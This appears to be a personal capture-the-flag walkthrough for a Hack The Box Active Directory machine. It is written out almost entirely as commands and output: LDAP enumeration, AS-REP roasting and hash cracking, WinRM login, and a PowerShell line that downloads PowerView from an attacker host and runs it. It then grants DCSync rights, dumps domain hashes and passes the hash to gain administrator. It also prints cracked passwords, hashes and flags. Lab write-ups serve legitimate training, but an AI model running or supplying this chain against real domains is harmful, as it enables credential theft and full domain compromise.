## User
### #WinDAPSearch
```sh
git clone https://github.com/ropnop/windapsearch.git
cd windapsearch
pip install -r requirements.txt
sudo apt-get install python3-ldap 
python3 windapsearch.py --dc-ip 10.129.95.210 -U
```
#### Interesting Fields:
```
cn: Sebastien Caron
userPrincipalName: sebastien@htb.local
cn: Lucinda Berger
userPrincipalName: lucinda@htb.local
cn: Andy Hislip
userPrincipalName: andy@htb.local
cn: Mark Brandt
userPrincipalName: mark@htb.local
cn: Santi Rodriguez
userPrincipalName: santi@htb.local
```
### Impacket list TGTs

Get Users with TGT property "Do not require Kerberos pre-authentication" #impacket-GetNPUsers
```sh
impacket-GetNPUsers 'htb.local/' -dc-ip '10.129.95.210' 
impacket-GetNPUsers 'htb.local/' -dc-ip '10.129.95.210' -request
```
#### Interesting Fields:
```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:77166f2efe63a8b5e124a35ec7d59f99$74f9ea93a2bc00985d5270213c8e77e86b2117e58b74eca721b275288d2aa401ed797f48e78364d102bf53bdee21d6ad1b219d7c8f22ac902a11941b38ab23b60c60b1919da07538588630e3cf1a9a235022f1734854ab180d757cc13d163118174250b985aaf2bbd81639f3c7121697c04f70e119c55cb13c16b902086499d86845aa72143ef6f29633529716f0301af63eabb82d8e19960ef0e0bda10ee53f2da4ea777194e5b056286aecf203bbe52f91126832cea8732af5373aef091852052d317084a5fde22c214d326730647fb93ba09c7375a1066a26ac9c7a38bea66efa662d1c7b
```
### Command
```sh
hashcat forestnopreauth.txt  /home/kali/Downloads/rockyou.txt
```
#### CREDS
```
User:
	svc-alfresco
Password:
	s3rvice
```
### USER PWN:
```sh
evil-winrm -i 10.129.95.210 -u svc-alfresco -p s3rvice
gc C:\Users\svc-alfresco\Desktop\user.txt
```

```
2f36f56384c2218eabf61e225d7584ba
```
## Root
### COMMAND
```sh
git clone https://github.com/BloodHoundAD/SharpHound.git
cd SharpHound
dotnet restore .
dotnet build
cp /home/kali/Desktop/Forest/windapsearch/SharpHound/bin/Debug/net462/SharpHound.exe
```
### WINRM
```winrm
upload SharpHound.exe
.\SharpHound.exe
download 20240520221238_BloodHound.zip
```
### COMMAND
```sh
python3 -m http.server
```
### WINRM Exchange Windows Permissions Privilege Escalation
#PrivilegeEscalation-Windows
#powerview
```winrm
(New-Object System.Net.WebClient).DownloadString('http://10.10.14.5:8000/PowerView.ps1') | IEX
net group "Exchange Windows Permissions" <Created UserName> /add
net localgroup "Remote Management Users" <Created UserName> /add
$password = convertto-securestring '<Created Password>' -AsPlainText -Force
$Cred = new-Object System.Management.Automation.PSCredential('htb\<Created UserName>',$password)
./PowerView.ps1 Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity <Created UserName> -Rights DCSync
```
### Invoke DCSync
```sh
impacket-secretsdump 'jesuschrist:password12345@10.129.95.210' -outputfile idcsynchashes.txt
hashcat dcsynchashes.txt.ntds ~/Downloads/rockyou.txt
```
#### Interesting Fields
```
483d4c70248510d8e0acb6066cd89072:plokmijnuhb
9248997e4ef68ca2bb47ae4e6f128668:s3rvice
```
### ROOT PWN:
```sh
impacket-psexec administrator@10.129.95.210 -hashes "aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6"
type C:\Users\Administrator\Desktop\root.txt
```

```
ed38b9aeadc029f6a4a37c802f5d9dca
```


## Ref
[nirajkharel/AD-Pentesting-Notes (github.com)](https://github.com/nirajkharel/AD-Pentesting-Notes)
[BloodHound with Kali Linux: 101 | Red Team Notes (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux)